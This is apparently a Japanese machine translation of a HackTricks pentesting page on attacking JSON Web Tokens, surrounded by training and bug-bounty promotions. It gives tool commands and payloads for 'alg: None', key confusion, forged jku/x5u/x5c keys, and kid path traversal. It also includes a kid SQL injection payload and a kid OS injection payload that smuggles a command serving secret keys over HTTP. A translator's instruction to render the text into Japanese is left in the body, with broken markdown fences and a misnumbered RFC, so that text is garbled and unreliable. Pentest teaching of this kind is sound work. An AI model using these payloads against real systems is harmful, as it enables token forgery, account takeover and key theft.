# JWTの脆弱性（Json Web Tokens）

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**バグバウンティのヒント**：**Intigriti**に**登録**し、**ハッカーのために作られたプレミアムなバグバウンティプラットフォーム**に参加しましょう！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)にアクセスして、最大**$100,000**のバウンティを獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

**この投稿の一部はこちらから引用されました：** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTをペネトレーションテストする素晴らしいツールの作者** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **クイックウィン**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool)を`All Tests!`モードで実行し、緑色のラインが出るのを待つ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
以下は、WebアプリケーションがJWTを不正確にチェックしている場合に、ツールが見つけるかもしれない例です：

![](<../.gitbook/assets/image (435).png>)

その後、プロキシでリクエストを検索するか、jwt\_toolを使用してそのリクエストに使用されたJWTをダンプできます：
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### データを改ざんしても何も変更しない

署名をそのままにしてデータを改ざんし、サーバーが署名をチェックしているかどうかを確認します。例えば、ユーザー名を「admin」に変更してみてください。

#### **トークンはチェックされていますか？**

* エラーメッセージが発生した場合、署名がチェックされています - 漏洩する可能性のある詳細なエラー情報を読んでください。
* 返されたページが異なる場合、署名がチェックされています。
* ページが同じであれば、署名はチェックされていません - Payload claimsを改ざんして何ができるかを見る時です！

### 起源

プロキシのリクエスト履歴でトークンがどこで生成されたかを確認します。サーバーで生成されるべきです、クライアントではありません。

* クライアント側から最初に見られた場合、**キー**はクライアント側のコードにアクセス可能です - 探し出してください！
* サーバーから最初に見られた場合、問題ありません。

### 期間

トークンが24時間以上持続するかどうかを確認します... おそらくそれは決して期限切れになりません。"exp"フィールドがある場合、サーバーがそれを正しく処理しているかを確認します。

### HMACシークレットをブルートフォース

[**このページを見てください。**](../generic-methodologies-and-resources/brute-force.md#jwt)

### アルゴリズムをNoneに変更する (CVE-2015-9235)

使用されるアルゴリズムを「None」に設定し、署名部分を削除します。

この脆弱性を試すために「JSON Web Token」というBurp拡張機能を使用し、JWT内の異なる値を変更します（リクエストをRepeaterに送り、「JSON Web Token」タブでトークンの値を変更できます。また、「Alg」フィールドの値を「None」に設定することもできます）。

### アルゴリズムをRS256（非対称）からHS256（対称）に変更する (CVE-2016-5431/CVE-2016-10555)

HS256アルゴリズムは、シークレットキーを使用して各メッセージに署名し、それを検証します。\
RS256アルゴリズムは、プライベートキーを使用してメッセージに署名し、公開キーを使用して認証します。

RS256からHS256にアルゴリズムを変更すると、バックエンドコードは公開キーをシークレットキーとして使用し、HS256アルゴリズムを使用して署名を検証します。

公開キーを使用してRS256をHS256に変更することで、有効な署名を作成できます。次のコマンドを実行して、Webサーバーの証明書を取得できます：
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### ヘッダー内の新しい公開鍵

攻撃者はトークンのヘッダーに新しい鍵を埋め込み、サーバーはこの新しい鍵を使用して署名を検証します（CVE-2018-0114）。

これは "JSON Web Tokens" Burp 拡張機能で行うことができます。\
（リクエストをリピーターに送り、JSON Web Token タブで "CVE-2018-0114" を選択してリクエストを送信します）。

### JWKS スプーフィング

トークンが “jku” ヘッダークレームを使用している場合、提供されたURLをチェックしてください。これは、トークンの検証に使用される公開鍵を保持するJWKSファイルが含まれているURLを指している必要があります。jkuの値を、トラフィックを監視できるWebサービスを指すようにトークンを改ざんします。

HTTPインタラクションを取得した場合、サーバーが提供しているURLから鍵をロードしようとしていることがわかります。 _jwt\_tool の -S フラグと -u_ [_http://example.com_](http://example.com) _引数を使用して新しい鍵ペアを生成し、提供されたURLを注入し、公開鍵を含むJWKSを生成し、プライベート鍵でトークンに署名します_

### Kid の問題

`kid` はオプショナルなヘッダークレームで、トークンに署名するための複数の鍵があり、署名を検証するために正しい鍵を探す必要がある場合に特に便利な鍵識別子を保持します。

#### "kid" の問題 - 鍵の露出

ヘッダーで "kid" クレームが使用されている場合、そのファイルまたはそのバリエーションがWebディレクトリにあるかどうかをチェックしてください。例えば `"kid":"key/12345"` の場合、Webルートで _/key/12345_ と _/key/12345.pem_ を探します。

#### "kid" の問題 - パストラバーサル

ヘッダーで "kid" クレームが使用されている場合、ファイルシステム内の別のファイルを使用できるかどうかをチェックしてください。予測可能な内容のファイルを選択するか、あるいは `"kid":"/dev/tcp/yourIP/yourPort"` を使用して接続性をテストするか、あるいはいくつかの **SSRF** ペイロードを試してみてください...\
_jwt\_tool の -T フラグを使用してJWTを改ざんし、kid クレームの値を変更し、元の署名を保持することを選択します_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
以下は、既知の内容を持つホスト内のファイルを使用して有効なJWTを偽造する方法についての説明です。例えば、Linuxシステムでは、ファイル `/proc/sys/kernel/randomize_va_space` の値は **2** に設定されています。そのため、"**kid**" パラメータにその **パス** を指定し、対称 **パスワード** として "**2**" を使用してJWTを生成すると、新しい有効なJWTを生成できる可能性があります。

#### "kid" の問題 - SQLインジェクション

"kid" の内容がデータベースからパスワードを取得するために使用されるシナリオでは、"kid" パラメータ内のペイロードを `non-existent-index' UNION SELECT 'ATTACKER';-- -` に変更し、秘密鍵 `ATTACKER` でJWTを署名することができます。

#### "kid" の問題 - OSインジェクション

"kid" パラメータが鍵のファイルへのパスを含み、このパスが **実行されるコマンド内** で使用されるシナリオでは、以下のようなペイロードを使用してRCEを取得し、秘密鍵を露出させることができるかもしれません: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### その他の攻撃

以下はテストされるべき既知の弱点です。

**クロスサービスリレー攻撃**

一部のWebアプリケーションは、信頼されたJWT「サービス」を使用してトークンを生成および管理します。過去には、JWTサービスのクライアントの1つで生成されたトークンが、JWTサービスの他のクライアントによって受け入れられる事例が発生しています。\
JWTがサードパーティサービスを介して発行または更新されていることが観察された場合、同じユーザー名/メールでそのサービスの他のクライアントにアカウントを登録できるかどうかを特定する価値があります。もしそうなら、そのトークンを取得してターゲットへのリクエストで再生してみてください。受け入れられますか？

* トークンが受け入れられた場合、任意のユーザーのアカウントを偽装する重大な問題が発生する可能性があります。ただし、サードパーティのアプリケーションに登録する場合、法的なグレーエリアに入る可能性があるため、より広範なテストの許可を求める必要があるかもしれません！

**expがチェックされていますか？**

“exp”ペイロードクレームは、トークンの有効期限をチェックするために使用されます。JWTはしばしばセッション情報がない場合に使用されるため、注意して扱う必要があります - 多くの場合、他人のJWTをキャプチャして再生すると、そのユーザーになりすますことができます。\
JWTリプレイ攻撃に対する1つの緩和策（JWT RFCによって推奨されている）は、“exp”クレームを使用してトークンの有効期限を設定することです。また、この値が処理され、有効期限が切れた場合にトークンが拒否されるように、アプリケーションに適切なチェックを設置することも重要です。トークンに“exp”クレームが含まれていて、テスト時間が許す場合は - トークンを保存して有効期限が過ぎた後に再生してみてください。 _jwt\_toolの-Rフラグを使用してトークンの内容を読み取り、タイムスタンプの解析と有効期限のチェックを行います（タイムスタンプはUTCで表示されます）_

* トークンがアプリケーションでまだ検証される場合、トークンが決して期限切れにならない可能性があるため、セキュリティリスクになるかもしれません。

### x5uとjku

#### jku

jkuは **JWK Set URL** を意味します。\
トークンが “**jku**” **ヘッダー** クレームを使用している場合は、提供されたURLを **確認してください**。これは、トークンを検証するための公開鍵を保持するJWKSファイルが含まれているURLを指すべきです。jkuの値をあなたがトラフィックを監視できるWebサービスを指すようにトークンを改ざんしてください。

まず、新しい証明書と新しい秘密鍵 & 公開鍵を作成する必要があります
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
以下は、JWT（JSON Web Tokens）をハッキングする技術についてのハッキング本の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保ったまま翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、pentesting、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

```markdown
次に、例えば[**jwt.io**](https://jwt.io)を使用して、**作成された公開鍵と秘密鍵を使い、パラメータjkuを作成した証明書に指すように**新しいJWTを作成できます。有効なjku証明書を作成するには、元の証明書をダウンロードして必要なパラメータを変更します。

公開証明書からパラメータ"e"と"n"を取得するには、次の方法を使用します：
```
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL。PEM形式でエンコードされたX.509（証明書フォーマットの標準）公開証明書のセットを指すURI。セットの最初の証明書は、このJWTを署名するために使用されるものでなければなりません。続く証明書はそれぞれ前のものに署名し、証明書チェーンを完成させます。X.509はRFC 52807で定義されています。証明書を転送するためには、トランスポートセキュリティが必要です。

このヘッダーを**自分のコントロール下にあるURLに変更して**、リクエストが受信されるかどうかを確認してください。その場合、**JWTを改ざんすることができる**可能性があります。

自分がコントロールする証明書を使用して新しいトークンを偽造するには、証明書を作成し、公開鍵と秘密鍵を抽出する必要があります：
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
例えば、[**jwt.io**](https://jwt.io) を使用して、**作成された公開鍵と秘密鍵を使い、パラメータ x5u を作成された証明書 .crt に指定して**、新しい JWT を作成することができます。

![](<../.gitbook/assets/image (439).png>)

これらの脆弱性を**SSRFに悪用する**こともできます。

#### x5c

このパラメータには、**base64でエンコードされた証明書**が含まれる場合があります：

![](<../.gitbook/assets/image (440).png>)

攻撃者が**自己署名証明書を生成し**、対応する秘密鍵を使用して偽造トークンを作成し、"x5c" パラメータの値を新しく生成された証明書に置き換え、他のパラメータ、すなわち n、e、x5t を変更すると、基本的に偽造トークンはサーバーによって受け入れられます。
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### 埋め込まれた公開鍵 (CVE-2018-0114)

以下のシナリオのように、JWTが公開鍵を埋め込んでいる場合：

![](<../.gitbook/assets/image (438).png>)

次のnodejsスクリプトを使用して、そのデータから公開鍵を生成することが可能です：
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
新しい秘密鍵/公開鍵を生成し、新しい公開鍵をトークン内に埋め込んで、新しい署名を生成することが可能です：
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
```markdown
このnodejsスクリプトを使用して、"n"と"e"を取得できます:
```
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
公開鍵と秘密鍵、そして新しい「n」と「e」の値を使用して、任意の情報を含む新しい有効なJWTを[jwt.io](https://jwt.io)で偽造することができます。

### JTI (JWT ID)

JTI (JWT ID)クレームは、JWTトークンに一意の識別子を提供します。これはトークンのリプレイを防ぐために使用されることがあります。\
しかし、IDの最大長が4（0001-9999）の場合を想像してください。リクエスト0001と10001は同じIDを使用します。したがって、バックエンドが各リクエストでIDを増加させている場合、**リクエストをリプレイする**ためにこれを悪用することができます（成功したリプレイごとに10000リクエストを送信する必要があります）。

### JWT 登録済みクレーム

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### ツール

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**登録**し、**ハッカーのために作られたプレミアムなバグバウンティプラットフォーム**に参加しましょう！今日[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)にアクセスして、最大**$100,000**の報酬を獲得し始めましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローに学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
